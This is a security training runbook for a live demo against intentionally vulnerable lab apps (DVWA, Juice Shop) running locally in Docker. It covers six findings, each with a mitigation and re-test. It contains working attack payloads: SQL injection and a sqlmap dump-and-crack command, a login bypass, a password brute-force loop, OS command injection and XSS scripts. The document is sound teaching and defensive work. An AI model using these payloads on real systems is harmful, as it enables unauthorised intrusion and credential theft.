# Live Demo Runbook — 6 Findings

Follow top to bottom. Each finding = **show vulnerable → exploit → mitigate → re-test**.
Keep two things open: a **terminal** (in this folder) and a **browser**.

> **sqlmap** lives at `/tmp/sqlmap-dev/` from today. If your Mac wiped `/tmp`, re-clone:
> `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /tmp/sqlmap-dev`

---

## 0. Before you start (once)

```bash
cd ~/Downloads/Claude/vuln-assessment
bash scripts/setup_lab.sh
```
Wait for `[+] Lab ready`. Then grab the session cookie for terminal tools:
```bash
export CK="PHPSESSID=$(grep -i PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $NF}'); security=low"
echo "$CK"
```
Log into DVWA in the browser too: **http://127.0.0.1:4280** → `admin` / `password` → **DVWA Security → Low**.

Talking point: *"All targets are bound to 127.0.0.1 inside Docker — isolated, authorized, intentionally vulnerable software."*

---

## Finding 1 — SQL Injection (DVWA)  ·  8.8 High

**Browser (visual):** DVWA → **SQL Injection** → in User ID box paste:
```
1' UNION SELECT user, password FROM users-- -
```
→ dumps every username + password hash on screen.

**Terminal (tool + auto-crack):**
```bash
python3 /tmp/sqlmap-dev/sqlmap.py \
  -u "http://127.0.0.1:4280/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="$CK" --batch -D dvwa -T users --dump
```
Expect: 4 injection techniques confirmed, `users` table dumped, MD5 hashes cracked (`password`, `abc123`, `charley`, `letmein`).

**Mitigate:** DVWA → **DVWA Security → Impossible**. Show **View Source**: prepared statement `$db->prepare(... :id ...)` + `is_numeric()` + CSRF token.

**Re-test (blocked):** repeat the UNION payload in the box → **no data returned**.

---

## Finding 2 — SQLi Auth Bypass (Juice Shop)  ·  9.8 Critical

**Terminal:**
```bash
curl -s -H "Content-Type: application/json" \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}' \
  http://127.0.0.1:3000/rest/user/login | python3 -c "import sys,json,base64;t=json.load(sys.stdin)['authentication']['token'];p=t.split('.')[1];p+='='*(-len(p)%4);print('Logged in as:', json.loads(base64.urlsafe_b64decode(p))['data']['email'])"
```
Expect: `Logged in as: admin@juice-sh.op` — admin login, no password.

**Browser (visual):** Juice Shop login → Email `' OR 1=1--`, any password → logged in as admin; the challenge banner **"Login Admin"** pops.

**Mitigate (explain):** parameterised query / ORM binding + server-side validation (Juice Shop is challenge-based, so this is a code-level fix, not a toggle).

---

## Finding 3 — Broken Authentication / No Lockout  ·  8.1 High

**Terminal (brute force + no-lockout proof):**
```bash
SID=$(grep -i PHPSESSID /tmp/dvwa_cookies.txt | awk '{print $NF}')
for p in 123456 admin letmein qwerty password monkey; do
  curl -s -b "PHPSESSID=$SID; security=low" \
    "http://127.0.0.1:4280/vulnerabilities/brute/?username=admin&password=$p&Login=Login" \
  | grep -q "Welcome to the password protected area" && echo "[+] FOUND admin:$p" || echo "[-] fail admin:$p"
done
```
Expect: `[+] FOUND admin:password`. Then show 10 bad logins don't lock the account.

**Mitigate:** DVWA Security → **Impossible**. View Source: lockout after **3 fails / 15 s** + prepared statement. Talk MFA + strong password policy.

---

## Finding 4 — OS Command Injection (DVWA)  ·  8.8 High

**Browser (visual):** DVWA (**Low**) → **Command Injection** → IP box:
```
127.0.0.1; id; uname -a
```
→ ping output **plus** `uid=33(www-data)` and the kernel line = remote code execution.

**Mitigate:** DVWA Security → **Impossible**. Re-run the same payload → `ERROR: You have entered an invalid IP.` View Source: octet `is_numeric()` allow-list.

---

## Finding 5 — Cross-Site Scripting (Reflected + Stored)  ·  6.1 Medium

**Reflected (browser, Low):** DVWA → **XSS (Reflected)** → name box:
```
<script>alert('XSS')</script>
```
→ script runs.

**Stored (browser, Low):** DVWA → **XSS (Stored)** → Message:
```
<script>alert('stored')</script>
```
Sign Guestbook → runs for every visitor (persists).

**Mitigate:** DVWA Security → **Impossible**. Re-submit → payload shows as **text** (`&lt;script&gt;`), not executed. View Source: `htmlspecialchars()`. Mention CSP as defence-in-depth.

---

## Finding 6 — Security Misconfiguration  ·  5.3 Medium

**Before (terminal):**
```bash
curl -s -D - -o /dev/null http://127.0.0.1:4280/login.php | grep -iE "server:|set-cookie|content-security|x-frame|strict-transport"
```
Expect: `Server: Apache/2.4.25 (Debian)`, cookie with **no** HttpOnly, and **no** CSP/X-Frame/HSTS.

**After — hardened proxy (terminal):**
```bash
curl -s -D - -o /dev/null http://127.0.0.1:4281/login.php | grep -iE "server:|set-cookie|content-security|x-frame|x-content-type|strict-transport"
```
Expect: `Server: nginx`, CSP + `X-Frame-Options: DENY` + `nosniff` + HSTS, and cookie now `HttpOnly; SameSite=Strict`. Config is in `hardening/nginx-hardened.conf`.

---

## Reset between runs
Flip DVWA back to **Low** (DVWA Security page) before re-demoing an exploit.
Stored XSS entries pile up — **Setup / Reset DB** clears them, then re-run `bash scripts/setup_lab.sh`.

## Teardown (after the demo)
```bash
docker compose -f docker-compose.yml -f docker-compose.hardened.yml down -v
```

## Quick order for a 10-min demo
1 (SQLi, flagship) → 4 (RCE, dramatic) → 2 (Juice Shop admin) → 5 (XSS) → 3 (brute) → 6 (headers before/after). Report + deck back the narrative.
